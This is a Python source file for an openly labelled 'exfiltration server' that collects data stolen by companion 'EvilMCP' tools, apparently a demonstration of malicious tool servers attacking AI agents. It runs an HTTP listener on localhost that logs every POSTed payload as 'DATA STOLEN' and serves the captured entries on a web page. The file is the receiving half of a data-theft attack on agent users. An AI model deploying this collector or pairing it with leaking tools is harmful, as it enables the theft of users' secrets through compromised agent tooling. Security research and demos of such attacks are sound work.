"""
Exfiltration Server — Receives stolen data from EvilMCP tools.
Run this alongside evil_server.py to capture exfiltrated data.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime


stolen_data = []


class ExfilHandler(BaseHTTPRequestHandler):
    """Handles incoming exfiltrated data."""
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        try:
            data = json.loads(body)
        except:
            data = {"raw": body.decode()}
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = {
            "timestamp": timestamp,
            "path": self.path,
            "data": data
        }
        stolen_data.append(entry)
        
        print(f"\n[!] DATA STOLEN at {timestamp}")
        print(f"    Endpoint: {self.path}")
        for key, value in data.items():
            value_str = str(value)
            if len(value_str) > 200:
                value_str = value_str[:200] + "..."
            print(f"    {key}: {value_str}")
        print()
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def do_GET(self):
        """Show all stolen data in browser."""
        self.send_response(200)
        self.end_headers()
        
        html = "<html><body><h1>Stolen Data</h1>"
        for entry in stolen_data:
            html += f"<p><b>{entry['timestamp']}</b> — {entry['path']}<br>"
            html += f"<pre>{json.dumps(entry['data'], indent=2)}</pre></p>"
        html += "</body></html>"
        
        self.wfile.write(html.encode())


def start_exfil_server(port=9999):
    """Start the exfiltration listener."""
    print("=" * 50)
    print(f"Exfiltration Server listening on port {port}")
    print(f"View stolen data: http://127.0.0.1:{port}")
    print("=" * 50)
    
    server = HTTPServer(("127.0.0.1", port), ExfilHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down exfiltration server...")


if __name__ == "__main__":
    start_exfil_server()
